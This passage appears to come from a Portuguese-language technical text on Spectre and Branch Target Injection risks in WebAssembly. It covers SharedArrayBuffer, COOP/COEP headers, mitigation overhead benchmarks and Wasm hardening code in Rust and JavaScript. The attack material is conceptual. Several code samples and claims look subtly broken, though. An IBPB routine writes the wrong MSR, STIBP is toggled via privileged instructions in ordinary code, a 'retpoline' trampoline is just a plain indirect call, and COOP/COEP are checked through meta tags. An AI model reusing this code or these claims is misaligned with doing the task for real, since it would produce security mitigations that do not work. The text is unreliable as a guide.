                shared: true
            }),
            // SharedArrayBuffer para comunicação entre threads
            shared_buffer: sab,
        }
    };

    return { sab, imports, view };
}

// 4. Carregar módulo Wam com isolamento
async function loadWasmWithIsolation(wasmUrl) {
    const { imports } = setupSharedArrayBuffer();

    try {
        const response = await fetch(wasmUrl, {
            // Headers para cross-origin
            headers: {
                'Cross-Origin-Resource-Policy': 'cross-origin'
            }
        });

        const bytes = await response.arrayBuffer();
        const { instance } = await WebAssembly.instantiate(bytes, imports);

        return instance;
    } catch (error) {
        console.error('Falha ao carregar módulo Wasm:', error);
        throw error;
    }
}
```

### 10.4.3 Requisitos de SharedArrayBuffer

SharedArrayBuffer é essencial para many-core programming em Wasm, mas também é o principal canal para ataques Spectre de medição de tempo:

```rust
// Configuração segura de SharedArrayBuffer para Wasm

// Quando SharedArrayBuffer é necessário para threads,
// mas queremos minimizar o risco de Spectre:

// 1. Usar SharedArrayBuffer apenas para comunicação necessária
// 2. Nunca expor SharedArrayBuffer para código não confiável
// 3. Implementar verificações no nível do navegador

// Exemplo de configuração segura
pub fn configure_shared_memory_safely() {
    // Definir limites estritos para memória compartilhada
    let config = SharedMemoryConfig {
        // Tamanho mínimo necessário
        initial_pages: 16,
        // Tamanho máximo para limitar superfície de ataque
        maximum_pages: 64,
        // Usar apenas para comunicação, não para dados sensíveis
        purpose: SharedMemoryPurpose::InterThreadCommunication,
        // Habilitar verificações de acesso
        enable_access_checks: true,
    };

    // Criar memória compartilhada com configurações seguras
    let memory = create_shared_memory(&config);

    // Configurar isolamento de dados
    // Dados sensíveis ficam em memória NÃO compartilhada
    // SharedArrayBuffer é usado apenas para metadados
    setup_data_isolation(memory);
}

#[derive(Clone)]
struct SharedMemoryConfig {
    initial_pages: u32,
    maximum_pages: u32,
    purpose: SharedMemoryPurpose,
    enable_access_checks: bool,
}

enum SharedMemoryPurpose {
    InterThreadCommunication,
    AudioProcessing,
    // Não deve ser usado para:
    // - Armazenamento de dados sensíveis
    // - Criptografia de chaves
    // - Processamento de tokens
}

fn create_shared_memory(config: &SharedMemoryConfig) -> Vec<u8> {
    let size = (config.initial_pages * 65536) as usize;
    vec![0u8; size]
}

fn setup_data_isolation(memory: Vec<u8>) {
    // Garantir que dados sensíveis estejam isolados
    // em memória não compartilhada
    // ...
}
```

### 10.4.4 Configuração de Headers COOP/COEP

Cross-Origin-Opener-Policy (COOP) e Cross-Origin-Embedder-Policy (COEP) são essenciais para habilitar SharedArrayBuffer de forma segura:

```javascript
// Configuração completa de COOP/COEP para Wasm

// 1. No servidor web (Node.js/Express)
function configureServerHeaders(app) {
    // COOP: Controla como a página pode ser aberta por outras
    app.use((req, res, next) => {
        // same-origin: A página só pode ser referenciada por páginas
        // da mesma origem
        res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');

        // require-corp: Recursos precisam ter CORP header
        res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');

        // Para Wasm com SharedArrayBuffer
        res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');

        next();
    });
}

// 2. Headers para diferentes contextos

// Contexto 1: Página principal que carrega Wasm
const mainPageHeaders = {
    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Embedder-Policy': 'require-corp',
    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-eval'"
};

// Contexto 2: Worker que processa Wasm
const workerHeaders = {
    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Embedder-Policy': 'require-corp'
};

// Contexto 3: SharedArrayBuffer para comunicação
const sabHeaders = {
    'Cross-Origin-Resource-Policy': 'cross-origin',
    'Access-Control-Allow-Origin': '*', // Cuidado: apenas para desenvolvimento
    'Access-Control-Allow-Methods': 'GET',
    'Access-Control-Allow-Headers': 'Content-Type'
};

// 3. Verificação de configuração
function verifyHeadersConfiguration() {
    // Verificar se COOP está ativo
    const coop = document.querySelector('meta[http-equiv="Cross-Origin-Opener-Policy"]');
    if (!coop || coop.content !== 'same-origin') {
        console.error('COOP não está configurado corretamente');
        return false;
    }

    // Verificar se COEP está ativo
    const coep = document.querySelector('meta[http-equiv="Cross-Origin-Embedder-Policy"]');
    if (!coep || coep.content !== 'require-corp') {
        console.error('COEP não está configurado corretamente');
        return false;
    }

    // Verificar se SharedArrayBuffer está disponível
    if (typeof SharedArrayBuffer === 'undefined') {
        console.error('SharedArrayBuffer não está disponível');
        return false;
    }

    return true;
}

// 4. Meta tags (alternativa a headers HTTP)
function setupMetaTags() {
    // NOTA: Meta tags NÃO são suficientes para SharedArrayBuffer
    // Headers HTTP são OBRIGATÓRIOS
    // Meta tags servem apenas como fallback para browsers antigos

    const meta = document.createElement('meta');
    meta.httpEquiv = 'Cross-Origin-Opener-Policy';
    meta.content = 'same-origin';
    document.head.appendChild(meta);

    const meta2 = document.createElement('meta');
    meta2.httpEquiv = 'Cross-Origin-Embedder-Policy';
    meta2.content = 'require-corp';
    document.head.appendChild(meta2);
}
```

### 10.4.5 Impacto das Mitigações de Spectre no Desempenho de Wasm

As mitigações de Spectre têm impacto significativo no desempenho de código Wasm:

```
+------------------------------------------------------------------+
|        IMPACTO DAS MITIGAÇÕES DE SPECTRE NO DESEMPENHO           |
+------------------------------------------------------------------+
|                                                                  |
|  MITIGAÇÃO                    | OVERHEAD TÍPICO | IMPACTO         |
|  ----------------------------|-----------------|-----------------|
|  Site Isolation               | 5-15%           | Alto            |
|  COOP/COEP headers           | 1-3%            | Baixo           |
|  Retpoline                    | 10-30%          | Muito alto      |
|  LFENCE after branches       | 5-20%           | Alto            |
|  STIBP (Single Thread IBP)   | 10-25%          | Alto            |
|  IBRS/IBPB (Intel)           | 15-30%          | Muito alto      |
|  KPTI (Kernel)               | 5-30%           | Variável        |
|                                                                  |
|  OVERHEAD TOTAL ESTIMADO:     30-70%                             |
|  (dependendo das mitigações ativas)                              |
+------------------------------------------------------------------+
```

```rust
// Benchmarking do impacto de mitigações Spectre em Wasm

// Estrutura para medir overhead de mitigações
pub struct SpectreMitigationBenchmark {
    iterations: usize,
    warmup_iterations: usize,
}

impl SpectreMitigationBenchmark {
    pub fn new() -> Self {
        SpectreMitigationBenchmark {
            iterations: 10000,
            warmup_iterations: 1000,
        }
    }

    // Medir overhead de retpoline
    pub fn benchmark_retpoline(&self) -> BenchmarkResult {
        let table: [usize; 16] = [
            func_a as usize, func_b as usize, func_c as usize, func_d as usize,
            func_e as usize, func_f as usize, func_g as usize, func_h as usize,
            func_i as usize, func_j as usize, func_k as usize, func_l as usize,
            func_m as usize, func_n as usize, func_o as usize, func_p as usize,
        ];

        // Aquecer
        for _ in 0..self.warmup_iterations {
            for i in 0..16 {
                let _ = protected_call_indirect(&table, i);
            }
        }

        // Medir sem retpoline
        let start_without = std::time::Instant::now();
        for _ in 0..self.iterations {
            for i in 0..16 {
                let _ = comparison::vulnerable_indirect_call(&table, i);
            }
        }
        let time_without = start_without.elapsed();

        // Medir com retpoline
        let start_with = std::time::Instant::now();
        for _ in 0..self.iterations {
            for i in 0..16 {
                let _ = comparison::protected_indirect_call(&table, i);
            }
        }
        let time_with = start_with.elapsed();

        let overhead = (time_with.as_nanos() as f64 / time_without.as_nanos() as f64 - 1.0) * 100.0;

        BenchmarkResult {
            name: "Retpoline".to_string(),
            time_without_mitigation: time_without,
            time_with_mitigation: time_with,
            overhead_percentage: overhead,
        }
    }

    // Medir overhead de memory fence
    pub fn benchmark_memory_fence(&self) -> BenchmarkResult {
        // Aquecer
        for _ in 0..self.warmup_iterations {
            let _ = std::hint::black_box(42);
        }

        // Medir sem fence
        let start_without = std::time::Instant::now();
        for _ in 0..self.iterations {
            let x = 42;
            let _ = std::hint::black_box(x + 1);
        }
        let time_without = start_without.elapsed();

        // Medir com fence
        let start_with = std::time::Instant::now();
        for _ in 0..self.iterations {
            let x = 42;
            std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
            let _ = std::hint::black_box(x + 1);
        }
        let time_with = start_with.elapsed();

        let overhead = (time_with.as_nanos() as f64 / time_without.as_nanos() as f64 - 1.0) * 100.0;

        BenchmarkResult {
            name: "Memory Fence".to_string(),
            time_without_mitigation: time_without,
            time_with_mitigation: time_with,
            overhead_percentage: overhead,
        }
    }

    // Medir overhead de LFENCE
    pub fn benchmark_lfence(&self) -> BenchmarkResult {
        // Aquecer
        for _ in 0..self.warmup_iterations {
            let _ = std::hint::black_box(42);
        }

        // Medir sem LFENCE
        let start_without = std::time::Instant::now();
        for _ in 0..self.iterations {
            let x = 42;
            let _ = std::hint::black_box(x + 1);
        }
        let time_without = start_without.elapsed();

        // Medir com LFENCE (via inline assembly)
        let start_with = std::time::Instant::now();
        for _ in 0..self.iterations {
            let x = 42;
            lfence();
            let _ = std::hint::black_box(x + 1);
        }
        let time_with = start_with.elapsed();

        let overhead = (time_with.as_nanos() as f64 / time_without.as_nanos() as f64 - 1.0) * 100.0;

        BenchmarkResult {
            name: "LFENCE".to_string(),
            time_without_mitigation: time_without,
            time_with_mitigation: time_with,
            overhead_percentage: overhead,
        }
    }
}

#[derive(Debug)]
struct BenchmarkResult {
    name: String,
    time_without_mitigation: std::time::Duration,
    time_with_mitigation: std::time::Duration,
    overhead_percentage: f64,
}

impl std::fmt::Display for BenchmarkResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "{}: overhead de {:.1}% (sem: {:?}, com: {:?})",
            self.name,
            self.overhead_percentage,
            self.time_without_mitigation,
            self.time_with_mitigation
        )
    }
}

// Funções dummy para benchmark
fn func_a() -> usize { 1 }
fn func_b() -> usize { 2 }
fn func_c() -> usize { 3 }
fn func_d() -> usize { 4 }
fn func_e() -> usize { 5 }
fn func_f() -> usize { 6 }
fn func_g() -> usize { 7 }
fn func_h() -> usize { 8 }
fn func_i() -> usize { 9 }
fn func_j() -> usize { 10 }
fn func_k() -> usize { 11 }
fn func_l() -> usize { 12 }
fn func_m() -> usize { 13 }
fn func_n() -> usize { 14 }
fn func_o() -> usize { 15 }
fn func_p() -> usize { 16 }

// LFENCE wrapper
fn lfence() {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        std::arch::asm!("lfence", options(nomem, nostack));
    }
    #[cfg(target_arch = "wasm32")]
    {
        // Em Wasm, usar atomic fence
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// Função para executar todos os benchmarks
pub fn run_all_benchmarks() {
    let bench = SpectreMitigationBenchmark::new();

    println!("Benchmarks de Mitigações Spectre em Wasm:");
    println!("==========================================");

    let results = vec![
        bench.benchmark_retpoline(),
        bench.benchmark_memory_fence(),
        bench.benchmark_lfence(),
    ];

    for result in &results {
        println!("{}", result);
    }

    let total_overhead: f64 = results.iter()
        .map(|r| r.overhead_percentage)
        .sum::<f64>() / results.len() as f64;

    println!("\nOverhead médio: {:.1}%", total_overhead);
}
```

### 10.4.6 Mitigações de Nível do Navegador

Os navegadores implementam várias mitigações específicas para proteger código Wasm contra Spectre:

```
+------------------------------------------------------------------+
|          MITIGAÇÕES DE NÍVEL DO NAVEGADOR                        |
+------------------------------------------------------------------+
|                                                                  |
|  CHROME/V8:                                                      |
|  +------------------------------------------------------------+  |
|  |  1. Site Isolation (habilitado por padrão desde Chrome 67) |  |
|  |  2. JIT Spray mitigations                                  |  |
|  |  3. Randomization de endereços de código JIT               |  |
|  |  4. Restricting SharedArrayBuffer                          |  |
|  |  5. COOP/COEP enforcement                                 |  |
|  |  6. Wasm bounds checks always emitted                      |  |
|  |  7. Indirect call verification                             |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  FIREFOX/SPIDERMONKEY:                                           |
|  +------------------------------------------------------------+  |
|  |  1. Fission (equivalente ao Site Isolation)                |  |
|  |  2. Wasm tiering (baseline + optimizing compiler)          |  |
|  |  3. Constant-time Wasm compilation                         |  |
|  |  4. Branch prediction hardening                            |  |
|  |  5. SharedArrayBuffer restrictions                         |  |
|  |  6. Spectre mitigations in JIT                             |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  SAFARI/JAVASCRIPTCORE:                                          |
|  +------------------------------------------------------------+  |
|  |  1. Process isolation                                      |  |
|  |  2. Wasm compilation tier                                  |  |
|  |  3. Bounds check hardening                                 |  |
|  |  4. JIT code randomization                                 |  |
|  |  5. SharedArrayBuffer restrictions                         |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

## 10.5 Branch Target Injection

Branch Target Injection (BTI) é um vetor de ataque que explora o Branch Target Buffer (BTB) para redirecionar branches indiretos. Em Wasm, isso é particularmente relevante devido ao uso de tabelas de funções para chamadas indiretas.

### 10.5.1 Mecânicas do BTI em CPUs Modernas

O BTB é uma estrutura de hardware que armazena o histórico de alvos de branches indiretos. Quando o CPU encontra um branch indireto, ele consulta o BTB para prever o alvo e começar a execução especulativa antes que o alvo real seja calculado.

```
+------------------------------------------------------------------+
|              FUNCIONAMENTO DO BTB                                |
+------------------------------------------------------------------+
|                                                                  |
|  +------------------+     +------------------+                   |
|  | Branch Address   | --> | Branch Target    |                   |
|  | (PC do branch)   |     | (endereço alvo)  |                   |
|  +------------------+     +------------------+                   |
|                                                                  |
|  FLUXO NORMAL:                                                   |
|  1. CPU encontra branch indireto (call_indirect em Wasm)        |
|  2. Consulta BTB pelo endereço do branch                         |
|  3. Se encontrado: prever alvo e executar especulativamente     |
|  4. Se não encontrado: esperar cálculo do alvo                   |
|                                                                  |
|  ATAQUE:                                                         |
|  1. Atacante treina BTB com branch de sua origem                 |
|  2. Atacante injeta endereço malicioso no BTB                   |
|  3. Vítima executa branch indireto                               |
|  4. CPU consulta BTB e obtém alvo malicioso                     |
|  5. CPU executa especulativamente código malicioso              |
|  6. Resultado do código malicioso vaza via cache                 |
+------------------------------------------------------------------+
```

### 10.5.2 Chamadas Indiretas do Wasm e BTI

As chamadas indiretas em Wasm (via `call_indirect`) são particularmente vulneráveis a BTI porque o compilador JIT gera branches indiretos que são mapeados diretamente para o BTB do hardware:

```rust
// Demonstração de como chamadas indiretas Wasm interagem com BTI

// Em Wasm, chamadas indiretas são implementadas via table
// O compilador JIT traduz isso para branches indiretos em assembly

// Exemplo de tabela de funções Wasm (conceitual)
// (table 16 funcref)
// (elem (i32.const 0) $func_a $func_b $func_c ...)

// Função que usa call_indireto
fn dispatch_function(table_index: usize, input: u32) -> u32 {
    // Em Wasm, isto seria:
    // local.get 0  ;; table_index
    // local.get 1  ;; input
    // call_indirect (type 0)

    // O compilador JIT gera:
    // 1. Ler o índice da tabela
    // 2. Acessar a entrada da tabela (branch indireto)
    // 3. Chamar a função no endereço obtido

    // Esta estrutura é vulnerável a BTI porque:
    // - O branch indireto pode ser redirecionado via BTB
    // - O preditor pode ser treinado com alvos diferentes
    // - A execução especulativa pode executar código malicioso

    let func = get_function_from_table(table_index);
    func(input)
}

// Obtém função da tabela (simulação)
fn get_function_from_table(index: usize) -> fn(u32) -> u32 {
    match index {
        0 => func_a,
        1 => func_b,
        2 => func_c,
        _ => func_default,
    }
}

fn func_a(x: u32) -> u32 { x + 1 }
fn func_b(x: u32) -> u32 { x + 2 }
fn func_c(x: u32) -> u32 { x + 3 }
fn func_default(x: u32) -> u32 { x }

// Função que demonstra o risco
fn demonstrate_bti_risk() {
    // Se um atacante consegue injetar um endereço no BTB
    // para a chamada indireta acima, a vítima pode executar
    // código malicioso especulativamente

    // Em um ataque real:
    // 1. Atacante treina BTB com endereço de func_malicious
    // 2. Vítima chama dispatch_function(0, 42)
    // 3. CPU vê o branch indireto e consulta BTB
    // 4. BTB retorna endereço de func_malicious (injetado)
    // 5. CPU executa func_malicious(42) especulativamente
    // 6. func_malicious acessa dados secretos
    // 7. Resultado vaza via cache side-channel
}
```

### 10.5.3 Estado do Preditor de Branches e Wasm

O estado do preditor de branches em um processador moderno é compartilhado entre processos no mesmo core. Isso permite que um processo influencie as previsões de outro:

```rust
// Como o estado do preditor de branches interage com Wasm

// Estrutura conceitual do preditor de branches
struct BranchPredictorState {
    // Branch Target Buffer (BTB)
    btb: HashMap<usize, usize>,
    // Pattern History Table (PHT)
    pht: HashMap<usize, u8>,
    // Return Stack Buffer (RSB)
    rsb: Vec<usize>,
    // Branch History Register (BHR)
    bhr: u64,
}

impl BranchPredictorState {
    // Simular treinamento do preditor
    fn train(&mut self, branch_addr: usize, target: usize, taken: bool) {
        // Atualizar BTB
        self.btb.insert(branch_addr, target);

        // Atualizar PHT
        let history = self.bhr as usize;
        *self.pht.entry(history).or_insert(0) =
            if taken { (*self.pht.entry(history).or_insert(0) + 1).min(3) }
            else { self.pht.entry(history).or_insert(3).saturating_sub(1) };

        // Atualizar BHR
        self.bhr = (self.bhr << 1) | (taken as u64);
    }

    // Consultar previsão
    fn predict(&self, branch_addr: usize) -> Option<(usize, bool)> {
        let target = self.btb.get(&branch_addr)?;
        let history = self.bhr as usize;
        let confidence = self.pht.get(&history).unwrap_or(&0);
        let taken = *confidence > 1;

        Some((*target, taken))
    }

    // Efeito de contexto em Wasm
    fn wasm_context_effect(&self) {
        // Quando um módulo Wasm é carregado, o preditor
        // pode conter estado de:
        // - Outro módulo Wasm (cross-module contamination)
        // - Código JavaScript da página
        // - Código do próprio navegador
        // Isso pode ser explorado para influenciar previsões
    }
}
```

### 10.5.4 Injeção via Chamadas Indiretas de Tabela

A injeção de branch targets via tabelas de funções Wasm é um vetor de ataque específico que explora o mecanismo de dispatch de chamadas indiretas:

```rust
// Exemplo de injeção via tabela de funções Wasm

// Tabela de funções (simulada em memória)
static mut FUNC_TABLE: Vec<usize> = Vec::new();

// Função que demonstra a injeção
unsafe fn demonstrate_table_injection() {
    // Inicializar tabela com funções legítimas
    FUNC_TABLE = vec![
        legitimate_func_1 as usize,
        legitimate_func_2 as usize,
        legitimate_func_3 as usize,
    ];

    // Atacante pode modificar a tabela para injetar
    // endereços maliciosos
    FUNC_TABLE[0] = malicious_func as usize;

    // Quando a vítima chamar via call_indirect com índice 0,
    // o compilador JIT gerará um branch indireto para
    // malicious_func, que pode ser explorado via BTI
}

fn legitimate_func_1(x: u32) -> u32 { x + 1 }
fn legitimate_func_2(x: u32) -> u32 { x + 2 }
fn legitimate_func_3(x: u32) -> u32 { x + 3 }

fn malicious_func(x: u32) -> u32 {
    // Esta função poderia acessar dados secretos
    // e vazar via cache side-channel
    let _ = x;
    0
}

// Mitigação: verificação de integridade da tabela
fn safe_call_indirect(table: &[usize; 3], index: usize, input: u32) -> u32 {
    // Verificar se o índice é válido
    if index >= table.len() {
        return 0;
    }

    // Verificar se o endereço da função é válido
    // (em um sistema real, isso seria mais sofisticado)
    let func_addr = table[index];

    // Usar retpoline para chamada segura
    safe_trampoline(func_addr, input)
}

// Trampoline seguro que impede BTI
fn safe_trampoline(func_addr: usize, input: u32) -> u32 {
    // Implementar retpoline aqui
    // Em um sistema real, isso usaria instruções específicas
    // do processador para impedir execução especulativa

    let func: fn(u32) -> u32 = unsafe { std::mem::transmute(func_addr) };
    func(input)
}
```

### 10.5.5 Estratégias de Mitigação para BTI em Wasm

Existem várias estratégias para mitigar BTI em Wasm, desde proteções no nível do hardware até mitigações no software:

```rust
// Estratégias de mitigação para BTI em Wasm

// 1. RETPOLINE (já discutido)
// Substitui branches indiretos por trampolines seguros

// 2. STIBP (Single Thread Indirect Branch Predictors)
// Impede que o preditor de branches seja influenciado
// por outros threads
#[cfg(target_arch = "x86_64")]
fn enable_stibp() {
    unsafe {
        // Habilitar STIBP via MSR
        std::arch::asm!(
            "rdmsr",
            "or eax, 0x400",  // STIBP bit
            "wrmsr",
            in("ecx") 0x48,  // IA32_SPEC_CTRL MSR
            lateout("eax") _,
            lateout("edx") _,
        );
    }
}

// 3. IBPB (Indirect Branch Predictor Barriers)
// Limpa o estado do preditor de branches
#[cfg(target_arch = "x86_64")]
fn flush_branch_predictor() {
    unsafe {
        std::arch::asm!(
            "wrmsr",
            in("ecx") 0x48,  // IA32_SPEC_CTRL MSR
            in("eax") 1,     // IBPB bit
            in("edx") 0,
        );
    }
}

// 4. LFENCE (Load Fence)
// Barreira de memória que impede execução especulativa
fn lfence_barrier() {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        std::arch::asm!("lfence", options(nomem, nostack));
    }
}

// 5. Mitigações específicas para Wasm
mod wasm_bti_mitigations {
    use super::*;

    // 5.1 Validação de índices de tabela
    pub fn validate_table_index(index: usize, table_size: usize) -> bool {
        index < table_size
    }

    // 5.2 Verificação de integridade da tabela
    pub fn verify_table_integrity(
        table: &[usize],
        expected: &[usize],
    ) -> bool {
        table == expected
    }

    // 5.3 Uso de branches condicionais em vez de indiretos
    // quando possível
    pub fn safe_dispatch(index: usize, input: u32) -> u32 {
        // Em vez de call_indireto, usar match
        // Isso gera branches condicionais em vez de indiretos
        match index {
            0 => func_a(input),
            1 => func_b(input),
            2 => func_c(input),
            _ => 0,
        }
    }

    // 5.4 Randomização de endereços de código
    // Torna mais difícil para o atacante prever endereços
    fn randomize_code_address(func: usize) -> usize {
        // Em um sistema real, isso usaria ASLR
        // Aqui demonstramos o conceito
        func ^ 0x1234 // XOR com valor aleatório
    }
}

// Funções dummy
fn func_a(x: u32) -> u32 { x + 1 }
fn func_b(x: u32) -> u32 { x + 2 }
fn func_c(x: u32) -> u32 { x + 3 }
```

## 10.6 Mitigações Específicas do Wasm

Além das mitigações de nível de hardware e navegador, existem estratégias específicas para o modelo de memória e execução do WebAssembly que podem reduzir a superfície de ataque de side-channels.

### 10.6.1 Resistência à Eliminação de Verificações de Limites

As verificações de limites (bounds checks) em Wasm são uma defesa fundamental contra Spectre v1. No entanto, compiladores JIT podem tentar eliminá-las por razões de desempenho:

```
+------------------------------------------------------------------+
|    RESISTÊNCIA À ELIMINAÇÃO DE BOUNDS CHECKS                     |
+------------------------------------------------------------------+
|                                                                  |
|  PROBLEMA:                                                       |
|  Compilador JIT pode reordenar ou eliminar bounds checks        |
|  para melhorar desempenho, criando gadgets Spectre               |
|                                                                  |
|  +------------------------------------------------------------+  |
|  |  // Código original (Wasm)                                 |  |
|  |  if index < array.len() {                                  |  |
|  |      value = array[index];                                 |  |
|  |  }                                                          |  |
|  |                                                             |  |
|  |  // Após otimização JIT (perigosa):                        |  |
|  |  value = array[index];  // bounds check removida!          |  |
|  |  // O JIT assume que o index é válido                       |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  SOLUÇÃO:                                                        |
|  Forçar que bounds checks sejam sempre emitidos e não           |
|  possam ser otimizados                                        |  |
|                                                                  |
|  +------------------------------------------------------------+  |
|  |  // Em Wasm, bounds checks são obrigatórios               |  |
|  |  // O compilador Wasm NÃO pode eliminá-los                 |  |
|  |                                                             |  |
|  |  ;; Wasm com bounds checks (obrigatório)                   |  |
|  |  local.get 0          ;; index                              |  |
|  |  memory.size          ;; tamanho da memória                 |  |
|  |  i32.mul              ;; multiplicar por página            |  |
|  |  i32.lt_u             ;; comparar                          |  |
|  |  if                   ;; SE válido                          |  |
|  |    local.get 0                                               |  |
|  |    i32.load          ;; acessar memória                     |  |
|  |  else                                                             |  |
|  |    ;; trap (erro de bounds check)                           |  |
|  |    unreachable                                               |  |
|  |  end                                                          |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

```rust
// Implementação de bounds checks resistentes a otimização

// Estratégia 1: Usar read_volatile para impedir otimização
#[inline(never)]
pub fn bounds_check_resistant_volatile(array: &[u8], index: usize) -> Option<u8> {
    // Bounds check que não pode ser otimizado
    if index >= array.len() {
        return None;
    }

    // Usar read_volatile para garantir que o acesso não seja reordenado
    unsafe {
        let ptr = array.as_ptr().add(index);
        Some(std::ptr::read_volatile(ptr))
    }
}

// Estratégia 2: Usar black_box para impedir otimização
#[inline(never)]
pub fn bounds_check_resistant_blackbox(array: &[u8], index: usize) -> Option<u8> {
    // Usar black_box para impedir que o compilador otimize o bounds check
    let index = std::hint::black_box(index);

    if index >= array.len() {
        return None;
    }

    Some(array[index])
}

// Estratégia 3: Implementação com fence
#[inline(never)]
pub fn bounds_check_resistant_fence(array: &[u8], index: usize) -> Option<u8> {
    // Fence antes do bounds check
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);

    if index >= array.len() {
        return None;
    }

    // Fence após o bounds check
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);

    Some(array[index])
}

// Estratégia 4: Bounds check com verificação em dois estágios
#[inline(never)]
pub fn bounds_check_two_stage(array: &[u8], index: usize) -> Option<u8> {
    // Primeiro estágio: verificar se o índice é razoável
    let len = array.len();
    if index >= len {
        return None;
    }

    // Segundo estágio: verificar novamente após operação
    let value = array[index];

    // Verificar se o valor é válido
    if value == 0 && index > 0 && array[index - 1] != 0 {
        // Pode ser um acesso inválido
        return None;
    }

    Some(value)
}

// Teste para verificar se bounds checks são preservados
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bounds_check_resistance() {
        let array = vec![1, 2, 3, 4, 5];

        // Acesso válido
        assert_eq!(bounds_check_resistant_volatile(&array, 2), Some(3));

        // Acesso inválido (deve retornar None, não crash)
        assert_eq!(bounds_check_resistant_volatile(&array, 10), None);
        assert_eq!(bounds_check_resistant_volatile(&array, usize::MAX), None);

        // Teste de stress: muitos acessos para verificar se há timing leak
        let mut timings = Vec::new();
        for _ in 0..1000 {
            let start = std::time::Instant::now();
            let _ = bounds_check_resistant_volatile(&array, 2);
            let elapsed = start.elapsed().as_nanos();
            timings.push(elapsed);
        }

        // Calcular variância
        let mean = timings.iter().sum::<u128>() as f64 / timings.len() as f64;
        let variance = timings.iter()
            .map(|&t| (t as f64 - mean).powi(2))
            .sum::<f64>() / timings.len() as f64;

        // Se a variância for muito alta, pode haver timing leak
        assert!(variance < 1000.0, "Variância alta detectada: {}", variance);
    }
}
```

### 10.6.2 Ofuscação de Padrões de Acesso a Memória

A ofuscação de padrões de acesso a memória torna mais difícil para um adversário observar padrões significativos via cache side-channel:

```rust
// Técnicas de ofuscação de padrões de acesso a memória

use std::collections::HashMap;

// Estrutura para ofuscação de acesso a memória
pub struct MemoryObfuscator {
    // Mapeamento original -> ofuscado
    mapping: HashMap<usize, usize>,
    // Mapeamento ofuscado -> original
    reverse_mapping: HashMap<usize, usize>,
    // Tamanho da memória
    memory_size: usize,
}

impl MemoryObfuscator {
    pub fn new(memory_size: usize) -> Self {
        let mut obfuscator = MemoryObfuscator {
            mapping: HashMap::new(),
            reverse_mapping: HashMap::new(),
            memory_size,
        };

        // Gerar mapeamento aleatório
        obfuscator.generate_random_mapping();

        obfuscator
    }

    // Gerar mapeamento aleatório
    fn generate_random_mapping(&mut self) {
        // Usar Fisher-Yates shuffle para gerar mapeamento
        let mut indices: Vec<usize> = (0..self.memory_size).collect();

        // Seed pseudo-aleatório (em produção, usar RNG seguro)
        let seed = 0xDEADBEEF;
        let mut state = seed;

        for i in (1..self.memory_size).rev() {
            // LCG pseudo-random
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            let j = (state as usize) % (i + 1);
            indices.swap(i, j);
        }

        // Criar mapeamentos
        for (original, obfuscated) in indices.iter().enumerate() {
            self.mapping.insert(original, *obfuscated);
            self.reverse_mapping.insert(*obfuscated, original);
        }
    }

    // Traduzir endereço original para ofuscado
    pub fn obfuscate(&self, address: usize) -> usize {
        *self.mapping.get(&address).unwrap_or(&address)
    }

    // Traduzir endereço ofuscado para original
    pub fn deobfuscate(&self, address: usize) -> usize {
        *self.reverse_mapping.get(&address).unwrap_or(&address)
    }

    // Acesso ofuscado a memória
    pub fn obfuscated_access(
        &self,
        memory: &[u8],
        original_address: usize,
    ) -> u8 {
        let obfuscated_addr = self.obfuscate(original_address);
        memory[obfuscated_addr]
    }
}

// Técnicas adicionais de ofuscação

// 1. Inserir acessos fictícios (dummy accesses)
pub fn insert_dummy_accesses(memory: &mut [u8], real_address: usize) -> u8 {
    // Acessar aleatoriamente outras posições antes do acesso real
    // Isso "polui" o cache e torna o padrão de acesso menos óbvio
    let dummy_addresses = [
        0x1000, 0x2000, 0x3000, 0x4000, 0x5000,
        0x6000, 0x7000, 0x8000, 0x9000, 0xA000,
    ];

    for &addr in &dummy_addresses {
        if addr < memory.len() {
            let _ = unsafe { std::ptr::read_volatile(memory.as_ptr().add(addr)) };
        }
    }

    // Agora acessar o endereço real
    memory[real_address]
}

// 2. Acesso em ordem aleatória
pub fn random_order_access(memory: &[u8], addresses: &[usize]) -> Vec<u8> {
    let mut results = Vec::with_capacity(addresses.len());
    let mut indices: Vec<usize> = (0..addresses.len()).collect();

    // Embaralhar índices
    let seed = 0xCAFEBABE;
    let mut state = seed;
    for i in (1..indices.len()).rev() {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
        let j = (state as usize) % (i + 1);
        indices.swap(i, j);
    }

    // Acessar na ordem embaralhada
    for idx in &indices {
        let addr = addresses[*idx];
        if addr < memory.len() {
            results.push(memory[addr]);
        }
    }

    results
}

// 3. Padded access (acesso com preenchimento)
pub fn padded_access(memory: &[u8], address: usize, pad_size: usize) -> Vec<u8> {
    let mut result = Vec::with_capacity(pad_size + 1);

    // Acessar posições antes do endereço real
    for i in 1..=pad_size {
        if address >= i {
            result.push(memory[address - i]);
        }
    }

    // Acessar o endereço real
    if address < memory.len() {
        result.push(memory[address]);
    }

    result
}
```

### 10.6.3 Tamanho Constante de Acesso à Memória

Forçar que todos os acessos à memória tenham tamanho constante impede que um adversário extraia informações através do tempo variável de acessos:

```rust
// Implementação de acessos à memória com tamanho constante

// Função que acessa memória com tamanho constante
// independentemente do conteúdo dos dados
pub fn constant_size_access(memory: &[u8], address: usize, secret: u8) -> u8 {
    // Garantir que o acesso sempre tenha o mesmo tamanho
    // independentemente do valor de 'secret'

    // Em vez de:
    // if secret > 0 { memory[address] }
